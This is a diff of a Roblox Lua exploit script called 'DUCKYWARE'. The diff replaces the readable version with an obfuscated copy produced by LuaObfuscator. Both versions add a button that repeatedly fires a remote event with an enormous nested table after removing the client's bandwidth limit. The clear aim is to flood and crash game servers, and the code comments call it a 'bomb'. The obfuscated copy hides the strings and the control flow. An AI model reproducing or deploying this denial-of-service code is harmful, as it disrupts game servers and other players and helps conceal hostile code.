@@ -1,86 +1,12 @@
--- Gui to Lua
--- Version: 3.2
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.2.4) ~  Much Love, Ferib 
 
--- Instances:
+]]--
 
-local ScreenGui = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local TextLabel_2 = Instance.new("TextLabel")
-local TextButton = Instance.new("TextButton")
-
---Properties:
-
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ResetOnSpawn = false
-
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(251, 125, 255)
-Frame.Position = UDim2.new(0.424117476, 0, 0.284875184, 0)
-Frame.Size = UDim2.new(0, 266, 0, 258)
-Frame.Active = true 
-Frame.Draggable = true
-
-TextLabel.Parent = Frame
-TextLabel.BackgroundColor3 = Color3.fromRGB(173, 10, 255)
-TextLabel.Size = UDim2.new(0, 266, 0, 50)
-TextLabel.Font = Enum.Font.Bangers
-TextLabel.Text = "DUCKYWARE"
-TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.TextSize = 48.000
-
-TextLabel_2.Parent = Frame
-TextLabel_2.BackgroundColor3 = Color3.fromRGB(173, 10, 255)
-TextLabel_2.Position = UDim2.new(0, 0, 0.806201577, 0)
-TextLabel_2.Size = UDim2.new(0, 266, 0, 50)
-TextLabel_2.Font = Enum.Font.Kalam
-TextLabel_2.Text = "Made by ducky#9999"
-TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.TextSize = 48.000
-
-TextButton.Parent = Frame
-TextButton.BackgroundColor3 = Color3.fromRGB(3, 251, 255)
-TextButton.Position = UDim2.new(0.255639076, 0, 0.403100789, 0)
-TextButton.Size = UDim2.new(0, 129, 0, 50)
-TextButton.Font = Enum.Font.Highway
-TextButton.Text = "SLAVE ACTIVATE"
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 14.000
-TextButton.MouseButton1Down:connect(function()
-	while wait(0.3) do --// don't change it's the best
-		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-		local function getmaxvalue(val)
-			local mainvalueifonetable = 499999
-			if type(val) ~= "number" then
-				return nil
-			end
-			local calculateperfectval = (mainvalueifonetable/(val+2))
-			return calculateperfectval
-		end
-		local function bomb(tableincrease, tries)
-			local maintable = {}
-			local spammedtable = {}
-			table.insert(spammedtable, {})
-			z = spammedtable[1]
-			for i = 1, tableincrease do
-				local tableins = {}
-				table.insert(z, tableins)
-				z = tableins
-			end
-			local calculatemax = getmaxvalue(tableincrease)
-			local maximum
-			if calculatemax then
-				maximum = calculatemax
-			else
-				maximum = 999999
-			end
-			for i = 1, maximum do
-				table.insert(maintable, spammedtable)
-			end
-			for i = 1, tries do
-				game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-			end
-		end
-		bomb(1, 1) --// change values if client crashes
-	end
-end)
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v49={};for v50=1051 -(852 + 198), #v8 do v6(v49,v0(v4(v1(v2(v8,v50,v50 + 1 + 0 + (0 -0))),v1(v2(v9,((1 + 1) -(1495 -(502 + 992))) + ((v50-(2 -1))% #v9),1 + ((v50-(854 -(242 + 611)))% #v9) + (174 -(139 + 34)))))%(768 -512)));end return v5(v49);end local v10=Instance.new(v7("\17\58\253\30\113\183\5\44\230","\66\89\143\123\20\217"));local v11=Instance.new(v7("\165\105\139\58\134","\227\27\234\87"));local v12=Instance.new(v7("\181\203\107\194\173\207\113\211\141","\225\174\19\182"));local v13=Instance.new(v7("\39\225\235\37\216\240\38\117\31","\115\132\147\81\148\145\68\16"));local v14=Instance.new(v7("\50\25\73\71\195\16\228\255\9\18","\102\124\49\51\129\101\144\139"));v10.Parent=game.Players.LocalPlayer:WaitForChild(v7("\124\254\55\89\239\94\213\35\73","\44\146\86\32\138"));v10.ResetOnSpawn=false;v11.Parent=v10;v11.BackgroundColor3=Color3.fromRGB((1347 -(879 + 35)) -(92 + 90),(1118 -(440 + 433)) -(367 -247),1786 -(278 + 1253));v11.Position=UDim2.new(0.424117476,0,1122.284875184 -(793 + 329),838 -(6 + 832));v11.Size=UDim2.new(0 + (1282 -(81 + 1201)),239 + 27,0 -0,128 + 130);v11.Active=true;v11.Draggable=true;v12.Parent=v11;v12.BackgroundColor3=Color3.fromRGB(173,2 + 8,210 + 45);v12.Size=UDim2.new((839 -(357 + 159)) -((399 -126) + 50),3 + 55 + (344 -136),0 -(0 -0),137 -87);v12.Font=Enum.Font.Bangers;v12.Text=v7("\141\155\207\89\220\158\143\222\87","\201\206\140\18\133");v12.TextColor3=Color3.fromRGB(0,(2387 -(607 + 354)) -((1691 -(374 + 222)) + 3 + 328),0);v12.TextSize=103 -(1499 -(41 + 1403));v13.Parent=v11;v13.BackgroundColor3=Color3.fromRGB(1410 -(566 + 671),8 + 0 + (6 -4),649 -394);v13.Position=UDim2.new(0 + 0,0,1151.806201577 -(865 + 286),0);v13.Size=UDim2.new(0 + 0,266,952 -(57 + 895),(85 -42) + (151 -(18 + 126)));v13.Font=Enum.Font.Kalam;v13.Text=v7("\20\186\64\28\83\225\186\121\191\81\26\24\250\224\96\226\29\64","\89\219\36\121\115\131\195");v13.TextColor3=Color3.fromRGB(0 -0,(0 -0) + (0 -0),0 + (0 -0));v13.TextSize=83 -(466 -(195 + 236));v14.Parent=v11;v14.BackgroundColor3=Color3.fromRGB((5 + 3) -(4 + 1),(305 -186) + (1896 -(657 + 1107)),255);v14.Position=UDim2.new(0.255639076 -0,0 -0,0.403100789 -0,(2183 -(1579 + 54)) -((276 -203) + 477));v14.Size=UDim2.new(0 + 0,44 + 85,1279 -(548 + 731),233 -183);v14.Font=Enum.Font.Highway;v14.Text=v7("\221\111\122\132\118\26\216\205\119\114\132\114\110\220","\142\35\59\210\51\58\153");v14.TextColor3=Color3.fromRGB(0 -0,0 -0,293 -(260 + 33));v14.TextSize=(1574 -(468 + 1099)) + 7;v14.MouseButton1Down:connect(function()while wait(1018.3 -(663 + 355)) do local v51=0 + 0;local v52;local v53;local v54;while true do if (v51==(661 -(246 + 415))) then v52=0;v53=nil;v51=3 -2;end if (v51==(1037 -((2152 -(965 + 547)) + 335 + 61))) then v54=nil;while true do if ((0 + 0)==v52) then local v55=970 -(455 + 515);while true do if (v55==0) then game:GetService(v7("\59\2\44\163\58\198\28\236\25\14\61\186\33","\117\103\88\212\85\180\119\175")):SetOutgoingKBPSLimit(math.huge);v53=nil;v55=(80 -37) -(16 + 19 + (662 -(496 + 159)));end if (v55==1) then v52=1;break;end end end if (v52==(1858 -((2881 -(550 + 1127)) + (867 -(38 + 177))))) then v54=function(v56,v57)local v59=0;local v60;local v61;local v62;local v63;local v64;while true do if (v59==1) then v62=nil;v63=nil;v59=2;end if (v59==((829 -(681 + 148)) + 0 + 0)) then v60=1166 -(1128 + 38);v61=nil;v59=1;end if (v59==2) then v64=nil;while true do if (v60==((54 -(12 + 37)) -3)) then local v70=336 -(158 + 178);while true do if (v70==(408 -(375 + 33))) then for v76=1,v56 do local v77=0 + 0;local v78;local v79;while true do if (v77==((1251 -(434 + 816)) -(0 -0))) then while true do if ((1657 -(512 + 1145))==v78) then v79={};table.insert(z,v79);v78=1 + 0 + 0;end if (((1938 -(1175 + 762)) + (0 -0))==v78) then z=v79;break;end end break;end if ((1870 -(741 + 1129))==v77) then v78=(0 + 0) -(0 + 0);v79=nil;v77=1750 -(1527 + 222);end end end v63=v53(v56);v70=1;end if (v70==(4 -3)) then v60=(2 + 4) -(7 -4);break;end end end if (v60==(9 -6)) then v64=nil;if v63 then v64=v63;else v64=1000856 -(468 + 389);end v60=(7 -4) + 1 + 0;end if (v60==1) then local v71=0 -0;while true do if (v71==(0 + 0)) then local v75=0;while true do if (0==v75) then table.insert(v62,{});z=v62[1563 -((3313 -1833) + 82)];v75=1;end if (v75==1) then v71=1 + 0 + 0;break;end end end if (v71==(1394 -(1225 + 168))) then v60=1 + 0 + 1 + 0;break;end end end if (v60==((1096 -(400 + 24)) -(65 + 363 + 240))) then for v73=477 -(287 + 189),v64 do table.insert(v61,v62);end for v74=1 + 0,v57 do game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(v61);end break;end if (v60==(26 -(21 + 5))) then v61={};v62={};v60=(3416 -(305 + 1629)) -(1075 + (815 -(354 + 55)));end end break;end end end;v54(1 + 0,1);break;end if (v52==(1 -0)) then local v58=0;while true do if (v58==(1212 -(919 + 293))) then v53=function(v65)local v66=231 -((775 -(400 + 350)) + 206);local v67;local v68;local v69;while true do if (v66==(1 + 0)) then v69=nil;while true do if (0==v67) then v68=1117659 -617660;if (type(v65)~=v7("\121\251\84\228\114\252","\23\142\57\134")) then return nil;end v67=1;end if (v67==1) then v69=v68/(v65 + ((14 -7) -5));return v69;end end break;end if (v66==(0 -0)) then local v72=0;while true do if (v72==0) then v67=1273 -(668 + (1810 -1205));v68=nil;v72=1;end if (1==v72) then v66=1096 -(881 + 202 + 12);break;end end end end end;v54=nil;v58=(1 + 0) -(0 + 0);end if (v58==(1 + 0)) then v52=1726 -(586 + 1138);break;end end end end break;end end end end);
